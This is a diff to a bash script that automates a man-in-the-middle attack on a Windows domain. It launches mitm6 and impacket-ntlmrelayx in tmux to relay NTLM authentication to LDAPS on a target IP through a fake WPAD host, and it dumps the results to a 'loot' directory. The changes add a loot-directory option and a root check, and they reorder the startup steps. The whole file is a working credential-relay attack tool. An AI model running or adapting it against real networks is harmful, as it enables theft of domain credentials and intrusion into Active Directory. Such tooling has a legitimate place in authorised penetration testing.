@@ -8,6 +8,7 @@
 
 # Define color variables
 RED="\033[31m"
+BLUE="\033[34m"
 GREEN="\033[32m"
 YELLOW="\033[33m"
 CYAN="\033[36m"
@@ -23,11 +24,12 @@ check_command() {
 
 # Print usage information
 usage() {
-  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v] [-s]${RESET}"
+  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v] [-s]${RESET}"
   echo -e "${YELLOW}Options:${RESET}"
   echo -e "  -d  Specify the target domain"
   echo -e "  -t  Specify the target IP"
   echo -e "  -i  Specify the network interface (default: eth0)"
+  echo -e "  -l  Specify loot output directory (default: dumps)"
   echo -e "  -v  Enable verbose logging"
   echo -e "  -s  Enable silent mode (suppress console output)"
   exit 1
@@ -75,6 +77,12 @@ done
 if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
   echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
   usage
+fi
+
+# Root privilege check
+if [ "$EUID" -ne 0 ]; then
+  echo -e "${RED}Error: This script must be run as root.${RESET}"
+  exit 1
 fi
 
 # Show the banner
@@ -162,20 +170,19 @@ start_tmux_window "$session_name" "mitm6" "mitm6 -i $interface -d $target_domain
   exit 1
 }
 
-# Start impacket-ntlmrelayx in tmux session
-echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
-  echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
-  exit 1
-}
-
-# Create dumps directory if it doesn't exist
+# Create loot directory if it doesn't exist
 if [ ! -d "$loot_dir" ]; then
   mkdir -p "$loot_dir"
 else
   echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
 fi
 
+# Start impacket-ntlmrelayx in tmux session
+echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
+start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
+  echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
+  exit 1
+}
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
